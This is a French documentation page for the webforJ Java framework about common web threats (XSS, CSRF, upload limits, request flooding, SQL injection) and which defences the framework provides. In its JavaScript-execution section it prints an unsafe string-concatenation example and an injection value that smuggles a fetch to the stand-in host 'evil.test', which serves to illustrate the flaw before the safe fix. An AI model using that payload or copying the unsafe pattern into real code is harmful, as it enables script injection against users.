---
sidebar_position: 2
title: Common Threats
description: >-
  How common web threats such as cross-site scripting (XSS), cross-site request
  forgery (CSRF), and SQL injection apply to a webforJ app, what the framework
  handles, and where you stay responsible.
_i18n_hash: f19a2bbb311243417c723fe49ad7d72f
---
Parce qu'une application webforJ s'exécute en Java sur le serveur et que le navigateur ne rend que l'interface (voir l'article [Interaction Client/Serveur](/docs/architecture/client-server)), plusieurs classes d'attaques sont contenues par conception. D'autres dépendent encore de la façon dont vous écrivez votre code. Cette page passe en revue les menaces qui comptent le plus et trace une ligne claire entre ce que webforJ gère et ce qui vous incombe.

## Cross-site scripting (XSS) {#cross-site-scripting-xss}

Une attaque de cross-site scripting (XSS) réussit lorsqu'une chaîne destinée à être affichée comme texte est plutôt interprétée comme du balisage actif dans le navigateur. webforJ ferme cette possibilité par défaut : lorsque vous définissez le texte d'un composant, la valeur est affichée littéralement, donc les balises qu'elle contient apparaissent comme des caractères et ne s'exécutent jamais.

```java
// Affiché comme les caractères littéraux "<b>hi</b>"
component.setText("<b>hi</b>");
```

Le rendu de balisage réel est une étape distincte et délibérée. webforJ traite une valeur comme du balisage uniquement lorsqu'elle est enveloppée dans `<html>...</html>`, ce que fait pour vous sous le capot la méthode `setHtml` du souci `HasHtml`. Une valeur définie d'une autre manière est d'abord réduite à du texte brut.

```java
// Rendu en tant que balisage, de manière intentionnelle
component.setHtml("<b>hi</b>");
```

:::danger Le balisage auquel vous optez n'est pas nettoyé pour vous
Le framework ne nettoie pas le balisage que vous enveloppez dans `<html>`. Dès qu'un fragment provient d'une personne, d'un enregistrement stocké, d'une chaîne de requête ou de toute autre source que vous ne contrôlez pas entièrement, nettoyez-le vous-même avant qu'il n'atteigne un composant. Utilisez un nettoyeur maintenu tel que [jsoup](https://jsoup.org/) ou le [OWASP Java HTML Sanitizer](https://owasp.org/www-project-java-html-sanitizer/) et fournissez-lui une liste autorisée des balises que vous souhaitez réellement autoriser.
:::

### Exécution de JavaScript {#executing-javascript}

La même règle s'applique aux scripts que vous exécutez sur le client avec `executeJs` et ses variantes asynchrones (l'API <JavadocLink type="foundation" location="com/webforj/concern/HasJsExecution" code='true'>HasJsExecution</JavadocLink>). `executeJs` exécute la chaîne que vous lui fournissez en tant que programme, donc tout ce qui se retrouve à l'intérieur de cette chaîne est ce que le navigateur exécute, y compris tout ce que vous avez intégré d'une valeur non fiable.

```java
// Dangereux : la valeur est intégrée au texte du programme
el.executeJs("greet('" + name + "')");
```

Si `name` contient `'); fetch('https://evil.test'); ('`, le navigateur exécute le programme suivant à la place :

```js
greet(''); fetch('https://evil.test'); ('')
```

Le `fetch` de l'attaquant est maintenant une instruction dans votre programme, donc il s'exécute. La concaténation a fait que l'entrée fait *partie du code*.

Gardez les valeurs non fiables complètement en dehors du script. Envoyez la valeur au client en tant que données, définissez-la sur l'élément, puis exécutez un script fixe qui la lit via le mot-clé `component` :

```java
// Sûr : la valeur est des données que le script lit, jamais du code
el.setProperty("greetName", name);
el.executeJs("greet(component.greetName)");
```

Ici, le programme que le navigateur exécute est toujours simplement `greet(component.greetName)`. Il n'y a aucune entrée non fiable à analyser. La valeur est dans une propriété, et la lecture d'une valeur chaîne ne l'exécute jamais, donc le même `name` est passé à `greet` comme texte plutôt que d'être exécuté en tant que code.

## Cross-site request forgery (CSRF) {#cross-site-request-forgery-csrf}

Une attaque de cross-site request forgery (CSRF) trompe le navigateur d'un utilisateur connecté pour qu'il envoie une action que l'utilisateur n'avait jamais l'intention d'envoyer. webforJ bloque cela pour son propre trafic sans aucune configuration : le framework ne fait confiance qu'aux requêtes appartenant à la session de l'utilisateur actuel, donc une page d'une autre origine ne peut pas contrôler l'application au nom de l'utilisateur.

Cela devient visible dans une seule situation. [Spring Security](/docs/security/getting-started) active sa propre protection contre les requêtes forgées pour chaque requête, et il n'a aucune connaissance du canal de webforJ, donc il rejeterait le trafic du framework et l'application ne se chargerait pas. L'intégration de Spring dans webforJ règle cela pour vous : <JavadocLink type="spring-integration" location="com/webforj/spring/security/WebforjSecurityConfigurer" suffix="#webforj()" code='true'>WebforjSecurityConfigurer.webforj()</JavadocLink> dit à Spring de sauter sa vérification pour les requêtes du framework webforJ. C'est sûr car le framework protège déjà ces requêtes lui-même, donc rien n'est laissé sans protection.

:::info Configuration Spring faite à la main
Si vous assemblez un `SecurityFilterChain` sans l'assistant `webforj()`, excluez vous-même les requêtes du framework de la vérification de Spring, et laissez cette vérification activée pour tous les points de terminaison que vous ajoutez.
:::

## Téléchargements de fichiers non contrôlés {#unbounded-file-uploads}

Accepter des fichiers de n'importe quelle taille ou quantité invite à une déni de service par épuisement de la mémoire, du disque, ou de la bande passante. Limitez ce que vous acceptez sur les composants de téléchargement : ils exposent `setMaxFileSize()` pour limiter chaque fichier et `setMaxFiles()` pour limiter combien arrivent en même temps.

Considérez cela comme la première ligne plutôt que la seule. Une limite côté navigateur peut être contournée, donc imposez un plafond sur le serveur également : définissez `webforj.fileUpload.maxSize` dans votre [configuration](/docs/configuration/properties) pour rejeter les téléchargements trop volumineux avant qu'ils n'atteignent votre code, et limitez la taille maximale de la requête dans votre conteneur de servlets ou votre proxy inverse.

## Inondation de requêtes {#request-flooding}

Un client manipulé peut également essayer de saturer le serveur : en envoyant une seule requête très grande, ou en lançant de nouvelles sessions d'application rapidement en succession jusqu'à épuisement de la mémoire ou d'autres ressources. Comme le serveur contrôle chaque application, un flot de l'un ou l'autre type l'atteint directement.

webforJ peut limiter les deux. Définissez `webforj.security.maxContentLength` pour limiter, en octets, la taille d'une requête que l'application accepte, et `webforj.security.maxInitPerMinute` pour limiter combien de nouvelles sessions d'application commencent chaque minute. Les deux par défaut à `0`, ce qui les désactive, donc définissez-les pour tout déploiement ouvert à un trafic non fiable. Voir [Configuration des propriétés](/docs/configuration/properties) pour plus de détails.

Comme pour les téléchargements, considérez ces points comme la couche intérieure et limitez également la taille de la requête dans votre conteneur de servlets ou votre proxy inverse.

## Injection SQL {#sql-injection}

webforJ n'est situé nulle part près de votre couche de données, donc la résistance à l'injection SQL repose entièrement sur votre code de requête. Utilisez des requêtes paramétrées ou des instructions préparées afin que les valeurs soient liées en tant que paramètres plutôt que concaténées dans l'instruction, et ne construisez jamais une requête en joignant des chaînes avec des entrées utilisateur. C'est la pratique ordinaire du JDBC et de la couche de persistance, et elle s'applique inchangée dans une application webforJ.
